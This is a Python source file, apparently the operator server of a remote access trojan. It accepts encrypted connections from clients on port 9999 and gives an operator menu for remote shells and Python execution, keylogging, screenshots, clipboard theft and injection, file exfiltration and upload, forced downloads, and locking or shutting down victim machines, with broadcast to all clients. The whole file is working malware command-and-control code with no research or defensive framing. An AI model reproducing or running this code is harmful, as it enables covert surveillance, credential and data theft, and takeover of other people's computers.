import json
import logging
import platform
import socket
import sys
import threading
import time
import traceback
from datetime import datetime

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

if platform.system() != 'Windows':
    # readline allows movement with arrowkeys on linux
    try:
        import readline
    except ImportError:
        pass

logging.basicConfig(level=logging.CRITICAL)

interface_help = """--h | See this Help Message
--e | Open a shell
--i | Open Remote Python Interpreter
--g | Grabs a screenshot
--u | User Info
--k (start) (stop) (status)| Manage Keylogger
--l | Returns log from client (includes keylogs)
--s | Transfers file to Client
--r | Transfers file to Server
--d | Download file from the web
--c | Copies to Client Clipboard
--p | Returns Client Current Clipboard
--q 1 | Lock Client Machine (Windows)
--q 2 | Shutdown Client Machine
--q 3 | Restart Client Machine
--x 1 | Restart Client Session
--x 2 | Disconnect Client
--b | Run Connection in Background (or CTRL-C)"""

turtle_help = """--h | See this Help Message
--a | Broadcast command to all connected clients
--l | List connected Clients
--i (ID) | Connect to a Client"""


def read_file(path, block_size=1024): 
    with open(path, 'rb') as f: 
        while True: 
            piece = f.read(block_size) 
            if piece: 
                yield piece 
            else: 
                return


def Hasher(MESSAGE):

    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(MESSAGE)
    return digest.finalize()


def verifySignature(publicKey, signature, message):
    try:
        publicKey.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except:
        return False


def sign(privateKey, data):
    signature = privateKey.sign(
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature


def encrypt(publicKey, plaintext):
    ciphertext = publicKey.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None)
    )
    return ciphertext


def decrypt(privateKey, ciphertext):
    plaintext = privateKey.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext


def public_bytes(publicKey):
    serializedPublic = publicKey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return serializedPublic


def errors(ERROR, line=True):
    error_class = ERROR.__class__.__name__
    error_msg = '%s' % error_class
    try:
        error_msg += ': {0}'.format(ERROR.args[0])
    except:
        error_msg += ':'
    if line:
        try:
            _, _, tb = sys.exc_info()
            line_number = traceback.extract_tb(tb)[-1][1]
            error_msg += ' (line {0})'.format(line_number)
        except:
            pass
    return error_msg


def json_dumps(data):
    return json.dumps(data).encode()


def json_loads(data):
    return json.loads(data.decode())


class MultiServer(object):

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.all_keys = []
        self.all_connections = []
        self.all_addresses = []

    def socket_create(self):
        """ Create Socket """
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            logging.error("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            logging.error("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def receive(self, conn, _print=True):
        """ Receive Buffer Size and Data from Client Encrypted with Connection Specific AES Key """
        target = self.all_connections.index(conn)
        Fer = self.all_keys[target]

        length = int(Fer.decrypt(conn.recv(2048)).decode())
        conn.send(b'<RECEIVED>')
        received = Fer.decrypt(self.recvall(conn, length))
        if _print:
            print(received.decode())
        return received

    def send(self, conn, data):
        """ Send Buffer Size and Data to Client Encrypted with Connection Specific AES Key """
        target = self.all_connections.index(conn)
        Fer = self.all_keys[target]

        encrypted = Fer.encrypt(data)
        conn.send(Fer.encrypt(str(len(encrypted)).encode()))
        conn.recv(1024)
        conn.send(encrypted)

    def accept_connections(self, _print=True):
        """ Accepts incoming connections and agrees on a AES key using RSA"""
        while 1:
            try:
                privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
                publicKey = privateKey.public_key()
                conn, address = self.socket.accept()
                conn.setblocking(1)
                clientPublic = serialization.load_pem_public_key(conn.recv(20480), backend=default_backend())
                conn.send(public_bytes(publicKey))

                def recv_data(conn):
                    buffer = int(conn.recv(4096).decode())
                    conn.send(b'<RECEIVED>')
                    data = self.recvall(conn, buffer)
                    conn.send(b'<RECEIVED>')
                    return data

                Hashed_Key = recv_data(conn)
                Encrypted = recv_data(conn)
                Hash_Encrypted = recv_data(conn)
                Signature = recv_data(conn)
                Encrypted_Signature = recv_data(conn)

                Encrypted_Verify = verifySignature(clientPublic, Encrypted_Signature, Hash_Encrypted)
                logging.debug('Encrypted Hash Signature Verification: {}'.format(str(Encrypted_Verify)))
                if not Encrypted_Verify:

                    logging.error('Error Verifying Hash')
                    continue

                Decrypted = decrypt(privateKey, Encrypted)
                Verify_Decryption = verifySignature(clientPublic, Signature, Hashed_Key)
                logging.debug('Hash Signature Verification: {}'.format(str(Verify_Decryption)))
                if not Verify_Decryption:

                    logging.error('Error Verifying Hash')
                    continue

                Compare = Hasher(Decrypted) == Hashed_Key

                logging.debug('Hash Verification: {}'.format(str(Compare)))
                if not Compare:

                    logging.error('Key and Hashed Key do not match!')
                    continue

                self.all_keys.append(Fernet(Decrypted))
                self.all_connections.append(conn)
                logging.debug('Fernet Key: {}'.format(str(Decrypted)))

                client_hostname = self.receive(conn, _print=False).decode()

                address = address + (client_hostname,)
                self.all_addresses.append(address)
                if _print:
                    msg = 'Connection has been established: {0} ({1})'.format(address[0], address[-1])
                    print('\n{0}\n{1}\n{0}'.format('-' * len(msg), msg))
                del privateKey
                del publicKey

            except Exception as e:
                del privateKey
                del publicKey
                logging.debug(errors(e))

    def list_connections(self, _print=True):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                self.send(conn, json_dumps(['LIST']))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                del self.all_keys[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        if _print:
            print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            logging.error('Client index should be an integer')
            return None
        try:
            conn = self.all_connections[target]
        except IndexError:
            logging.error('Not a valid selection')
            return None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return conn

    def send_file(self, conn, file_to_transfer, save_as):
        """ Send file from Server to Client """
        # returns None
        self.send(conn, json_dumps(['SEND FILE', save_as]))
        self.receive(conn, _print=False)
        for line in read_file(file_to_transfer):
            self.send(conn, line)
            self.receive(conn, _print=False)

        self.send(conn, b'<FILE TRANSFER DONE>')
        self.receive(conn)

    def receive_file(self, conn, file_to_transfer, save_as):
        """ Transfer file from Client to Server """

        self.send(conn, json_dumps(['RECEIVE FILE', file_to_transfer]))
        with open(save_as, 'wb') as f:
            while 1:
                data = self.receive(conn, _print=False)
                if data == b'<FILE TRANSFER DONE>':
                    self.send(conn, b'<RECEIVED>')
                    break
                f.write(data)
                self.send(conn, b'<RECEIVED>')
        self.receive(conn)

    def _get_log(self, conn):
        self.send(conn, json_dumps(['LOG_FILE']))
        return self.receive(conn, _print=False).decode()

    def screenshot(self, conn, save_as='{}.png'.format(str(datetime.now()).replace(':','-'))):
        """ Take screenshot on Client """
        # returns True/False, None/error
        self.send(conn, json_dumps(['SCREENSHOT']))
        data = self.receive(conn, _print=False).decode()
        if data == '<ERROR>':
            self.send(conn, b'<RECEIVING>')
            error = self.receive(conn, _print=False)
            return False, error
        self.receive_file(conn, data, save_as)
        return True, None

    def client_exec(self, conn, command):
        """ Remote Python Interpreter """
        # returns command_output/None
        self.send(conn, json_dumps(['EXEC', command]))
        data = json_loads(self.receive(conn, _print=False))
        if data[1] != None:
            return data[1]
        if data[0] != '':
            return data[0]

    def python_interpreter(self, conn):
        """ Remote Python Interpreter CLI"""
        print('CAUTION! Using this feature wrong can break the client until restarted.')
        print('Tip: help("modules") lists available modules')
        while 1:
            command = input('>> ')
            if command == 'exit' or command == 'exit()':
                break
            result = self.client_exec(conn, command)
            if not result == None:
                print(result.rstrip("\n"))

    def client_shell(self, conn, command, _print=True):
        """ Remote Shell with Client """
        # returns command_output, cwd
        system = self.get_platform(conn)
        if command.lower() == 'cd':
            self.send(conn, json_dumps(['SHELL', command]))
            result = self.receive(conn, _print=False)
            if system == 'Windows':
                result += '\n'
            if _print:
                print(result)
            return result, result
        if command[:2].lower() == 'cd' or command[:5].lower() == 'chdir':
            self.send(conn, json_dumps(['SHELL', command]))
            cwd = json.loads(self.receive(conn, _print=False).decode())
            if cwd[0] == '<ERROR>':
                if _print:
                    print(cwd[1])
                cwd = self.get_cwd(conn)
                return cwd[1], cwd
            else:
                if _print and system == 'Windows':
                    print()
                return cwd[0], cwd[0]
        self.send(conn, json_dumps(['SHELL', command]))
        result = []
        while 1:
            output = self.receive(conn, _print=False)
            if output == b'<DONE>':
                break
            result.append(output)
            if _print:
                try:
                    print(output.decode())
                except UnicodeDecodeError:
                    print(output)
            self.send(conn, json_dumps(['<LISTENING>']))
        cwd = self.get_cwd(conn)
        return result, cwd

    def get_platform(self, conn):
        """ Get Client Platform """
        # platform.system()
        self.send(conn, json_dumps(['<PLATFORM>']))
        return self.receive(conn, _print=False).decode()

    def get_cwd(self, conn):
        """ Get Client cwd """
        # returns cwd
        self.send(conn, json_dumps(['<GETCWD>']))
        return self.receive(conn, _print=False).decode()

    def start_keylogger(self, conn):
        """ Start Keylogger """
        # returns True/False
        self.send(conn, json_dumps(['START_KEYLOGGER']))
        return json_loads(self.receive(conn, _print=False))[0]

    def keylogger_status(self, conn):
        """ Get Keylogger Status """
        # returns True/False
        self.send(conn, json_dumps(['KEYLOGGER_STATUS']))
        return json_loads(self.receive(conn, _print=False))[0]

    def stop_keylogger(self, conn):
        """ Stop Keylogger """
        # returns True/False
        self.send(conn, json_dumps(['STOP_KEYLOGGER']))
        return json_loads(self.receive(conn, _print=False))[0]

    def get_log(self, conn, save_as='{}.log'.format(str(datetime.now()).replace(':','-'))):
        """ Transfer log to Server """
        # save_as: file name
        log = self._get_log(conn)
        self.receive_file(conn, log, save_as)
        return save_as

    def get_info(self, conn, _print=True):
        self.send(conn, json_dumps(['INFO']))
        return self.receive(conn, _print=_print)

    def fill_clipboard(self, conn, data):
        # data[0]: True/False
        # data[1]: None/error
        self.send(conn, json_dumps(['COPY', data]))
        data = json_loads(self.receive(conn, _print=False))
        return data[0], data[1]

    def get_clipboard(self, conn, _print=False):
        """ Get Client Clipboard """
        # data[0]: True/False
        # data[1]: clipboard/error
        self.send(conn, json_dumps(['PASTE']))
        data = json_loads(self.receive(conn, _print=False))
        if _print and data[0]:
            print(data[1])
        return data[0], data[1]

    def _get_info(self, conn):
        """ Get Client Info """
        
        # info = [
        #     platform.system()
        #     os.path.expanduser('~')
        #     getpass.getlogin()
        # ]

        self.send(conn, json_dumps(['<INFO>']))
        return json_loads(self.receive(conn, _print=False))

    def download(self, conn, url, file_name):
        """ Download File To Client """
        # returns True/False, None/error
        self.send(conn, json_dumps(['DOWNLOAD', url, file_name]))
        data = json_loads(self.receive(conn, _print=False))
        return data[0], data[1]

    def restart_session(self, conn):
        """ Restart Client Session """
        # returns True
        self.send(conn, json_dumps(['RESTART_SESSION']))
        self.receive(conn, _print=False)
        self.list_connections(_print=False)
        return True

    def disconnect(self, conn):
        """ Disconnect Client """
        # returns True
        self.send(conn, json_dumps(['DISCONNECT']))
        self.receive(conn, _print=False)
        conn.close()
        self.list_connections(_print=False)
        return True

    def lock(self, conn):
        """ Lock Client Machine (Windows Only) """
        self.send(conn, json_dumps(['LOCK']))
        return self.receive(conn, _print=False)
    
    def shutdown(self, conn):
        """ Shutdown Client Machine """
        self.send(conn, json_dumps(['SHUTDOWN']))
        self.list_connections(_print=False)
        return

    def restart(self, conn):
        """ Restart Client Machine """
        self.send(conn, json_dumps(['RESTART']))
        self.list_connections(_print=False)
        return

    def shell(self, conn):
        """ Remote Shell Interface """
        cwd = self.get_cwd(conn)
        command = ''
        info = self._get_info(conn)
        hostname = self.all_addresses[self.all_connections.index(conn)][-1]

        while 1:
            if not info[0] == 'Windows':
                cwd = cwd.replace(info[1], '~')
                _input = '{0}@{1}:{2} $ '.format(info[2], hostname, cwd)
            else:
                _input = '{0}>'.format(cwd)

            command = input(_input)
            if command.strip() == '':
                continue
            if command == 'exit':
                break
            _, cwd = self.client_shell(conn, command)

    def selector(self, conn, command):
        if '--b' in command:
            return True
        if '--e' in command:
            try:
                self.shell(conn)
            except (EOFError, KeyboardInterrupt):
                print()
            return
        if '--i' in command:
            try:
                self.python_interpreter(conn)
            except (EOFError, KeyboardInterrupt):
                print()
            return
        if '--c' in command:
            text_to_copy = input('Text to copy: ')
            result, error= self.fill_clipboard(conn, text_to_copy)
            if result:
                print('Copied to Clipboard.')
            else:
                print(error)
            return
        if '--u' in command:
            self.get_info(conn)
            return
        if '--l' in command:
            print('Transferring log...')
            log = self.get_log(conn)
            print('Log saved as: {}'.format(log))
            return
        if command[:3] == '--k':
            if command[4:].strip() == 'start':
                if self.start_keylogger(conn):
                    print('Started Keylogger')
                else:
                    print('Keylogger ImportError')
                return
            if command[4:].strip() == 'status':
                if self.start_keylogger(conn):
                    print('Keylogger Running')
                else:
                    print('Keylogger is not running.')
                return
            if command[4:].strip() == 'stop':
                if self.stop_keylogger(conn):
                    print('Stopped Keylogger')
                else:
                    print('Keylogger ImportError')
                return
        if '--p' in command:
            self.get_clipboard(conn, _print=True)
            return
        if command[:3] == '--x':
            command = command[4:].strip()
            if command == '1':
                print('Restarting Session...')
                return self.restart_session(conn)
            elif command == '2':
                print('Disconnecting Client...')
                return self.disconnect(conn)
        if command[:3] == '--q':
            command = command[4:].strip()
            if command == '1':
                if self.lock(conn):
                    print('Locked Client Machine')
                else:
                    print('Locking is only available on Windows.')
                return
            elif command == '2':
                print('Shutting down Client Machine')
                self.shutdown(conn)
                return True
            elif command == '3':
                print('Restarting Client Machine')
                self.restart(conn)
                return True
        if '--d' in command:
            file_url = input('File URL: ')
            file_name = input('Filename: ')
            print('Downloading File...')
            result, error = self.download(conn, file_url, file_name)
            if result:
                print('Downloaded file successfully')
            else:
                print(error)
            return
        if '--s' in command:
            file_to_transfer = input('File to Transfer to Client: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            self.send_file(conn, file_to_transfer, save_as)
            print('File transferred.')
            return
        if '--r' in command:
            file_to_transfer = input('File to Transfer to Server: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            self.receive_file(conn, file_to_transfer, save_as)
            print('File transferred.')
            return
        if '--g' in command:
            print('Taking Screenshot...')
            self.screenshot(conn)
            return
        if '--h' in command:
            print(interface_help)
            return
        print("Invalid command: '--h' for help.")

    def broadcast(self, command):
        connections = self.all_connections[:]
        addresses = self.all_addresses[:]
        for conn in connections:
            try:
                print('Response from {0}:'.format(addresses[connections.index(conn)][0]))
                self.selector(conn, command)
            except Exception as e:
                print(errors(e))

    def interface(self, conn):
        """ CLI Interface to Client """
        ip = self.all_addresses[self.all_connections.index(conn)][0]
        while True:
            command = input('{0}> '.format(ip))
            if self.selector(conn, command):
                break

    def turtle(self):
        """ Connection Selector """
        print("Type '--h' for help")
        while True:
            try:
                command = input('> ')
                if command == '--h':
                    print(turtle_help)
                    continue
                elif command[:3] == '--a':
                    self.broadcast(input('Command to broadcast: '))
                    continue
                elif command == '--l':
                    self.list_connections()
                    continue
                elif '--i' in command:
                    conn = self.get_target(command)
                    if conn is not None:
                        try:
                            self.interface(conn)
                        except (EOFError, KeyboardInterrupt):
                            print()
                        except Exception as e:
                            print('Connection lost: {}'.format(errors(e)))
                            index = self.all_connections.index(conn)
                            del self.all_connections[index]
                            del self.all_addresses[index]
                            del self.all_keys[index]
                    else:
                        print('Invalid Selection.')
                    continue
                print("Invalid command: '--h' for help.")
            except (EOFError, KeyboardInterrupt):
                print('\nShutting down Server...')
                time.sleep(2)
                break
            except Exception as e:
                print(errors(e))


def accept_conns(server):
    server.socket_create()
    server.socket_bind()
    server.accept_connections()
    return


def accept_thread(server):
    t = threading.Thread(target=accept_conns, args=(server,))
    t.daemon = True
    t.start()
    return


if __name__ == '__main__':
    server = MultiServer()
    accept_thread(server)
    server.turtle()
